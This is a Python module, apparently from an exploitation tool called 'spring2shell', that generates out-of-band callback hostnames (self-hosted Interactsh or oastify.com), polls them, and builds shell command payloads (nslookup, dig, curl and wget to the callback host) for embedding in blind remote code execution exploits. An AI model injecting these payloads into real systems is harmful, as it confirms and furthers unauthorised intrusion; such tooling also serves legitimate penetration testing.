"""
Out-of-Band (OOB) callback support for blind RCE detection.

Integrates with self-hosted Interactsh (https://github.com/projectdiscovery/interactsh)
or falls back to public callback services.

Usage:
    # Configure once at startup:
    configure_oob(args)

    # Generate a unique callback host:
    host = generate_oob_host()  # e.g. "abc123.interact.example.com"

    # After sending blind payload, poll for callbacks:
    received = poll_oob(host, wait_seconds=5)
"""

from __future__ import annotations

import hashlib
import logging
import os
import time
from typing import Any

import requests

from spring2shell.utils.logging import log_event, log_swallowed_exception
from spring2shell.utils.network import ssl_verify


# ---------------------------------------------------------------------------
# OOB config
# ---------------------------------------------------------------------------

_oob_server: str | None = None
_oob_token: str | None = None


def configure_oob(args: Any) -> None:
    """Set OOB server and token from CLI args."""
    global _oob_server, _oob_token
    _oob_server = getattr(args, "oob_server", None)
    _oob_token = getattr(args, "oob_token", None)
    if _oob_server:
        log_event(logging.INFO, f"OOB server: {_oob_server}")
    else:
        log_event(
            logging.WARNING,
            "No OOB server configured — blind RCE will use public services (may log data). "
            "Use --oob-server with self-hosted interactsh for operational security.",
        )


def is_oob_configured() -> bool:
    """Return True if a self-hosted OOB server is configured."""
    return bool(_oob_server)


def generate_oob_host() -> str:
    """Generate a unique OOB callback hostname.

    Uses the configured Interactsh server if available.
    Falls back to a random subdomain on oastify.com.

    Returns:
        A unique hostname string (e.g. ``"abc123def456.interact.example.com"``).
    """
    token = hashlib.sha256(os.urandom(16)).hexdigest()[:12]

    if _oob_server:
        base = (
            _oob_server
            .rstrip("/")
            .replace("https://", "")
            .replace("http://", "")
        )
        return f"{token}.{base}"

    # Fallback: use public OOB service
    return f"{token}.oastify.com"


def poll_oob(oob_host: str, wait_seconds: int = 5) -> bool:
    """Poll the Interactsh server for DNS/HTTP callbacks.

    Args:
        oob_host:     Hostname returned by :func:`generate_oob_host`.
        wait_seconds: How long to wait before polling (allows callback to arrive).

    Returns:
        ``True`` if at least one interaction was received, ``False`` otherwise.
        Always returns ``False`` if no OOB server is configured.
    """
    if not _oob_server:
        log_event(
            logging.DEBUG,
            f"OOB poll skipped (no server configured). "
            f"Manually check {oob_host} for interactions.",
        )
        return False

    time.sleep(wait_seconds)

    interaction_id = oob_host.split(".")[0]
    poll_url = f"{_oob_server.rstrip('/')}/poll"
    headers: dict[str, str] = {}
    if _oob_token:
        headers["Authorization"] = f"Bearer {_oob_token}"

    try:
        resp = requests.get(
            poll_url,
            params={"id": interaction_id, "secret": _oob_token or ""},
            headers=headers,
            timeout=10,
            verify=ssl_verify(),
        )
        if resp.status_code == 200:
            data = resp.json()
            interactions = data.get("data") or []
            if interactions:
                log_event(
                    logging.WARNING,
                    f"OOB callback CONFIRMED for {oob_host}: "
                    f"{len(interactions)} interaction(s)",
                )
                return True
    except Exception as exc:
        log_swallowed_exception("OOB poll", exc)

    return False


def build_oob_payloads(oob_host: str) -> list[str]:
    """Build a list of OS commands that trigger an OOB callback.

    Args:
        oob_host: The OOB callback hostname.

    Returns:
        List of shell command strings to embed in exploit payloads.
    """
    return [
        # DNS lookup (most reliable, available on all Linux distros)
        f"nslookup {oob_host}",
        f"dig {oob_host}",
        f"host {oob_host}",
        # HTTP callback (requires curl/wget on target)
        f"curl -sk http://{oob_host}/rce",
        f"wget -q http://{oob_host}/rce -O /dev/null",
        # Combined (try DNS first, fall back to HTTP)
        f"nslookup {oob_host} || curl -sk http://{oob_host}/rce",
    ]
